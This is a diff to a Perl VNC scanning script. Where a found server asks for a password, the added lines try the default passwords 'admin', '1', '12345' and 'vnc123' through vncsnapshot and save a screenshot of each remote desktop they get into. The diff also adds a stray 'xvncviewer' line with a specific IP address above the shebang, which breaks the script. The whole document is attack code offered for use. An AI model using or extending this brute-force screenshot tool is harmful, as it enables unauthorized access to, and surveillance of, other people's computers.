@@ -1,3 +1,4 @@
+xvncviewer 103.179.173.43:5900
 #!/usr/bin/perl -w
 #
  my ($vte);
@@ -47,4 +48,8 @@ if (defined($security)) {
 } else {
 qx!echo $hostname:$port >> qvncDE!;
 	warn "[$hostname:$port] Password required - ignoring.\n";
+	system("echo 'admin' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
+	system("echo '1' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
+	system("echo '12345' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
+	system("echo 'vnc123' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
 }
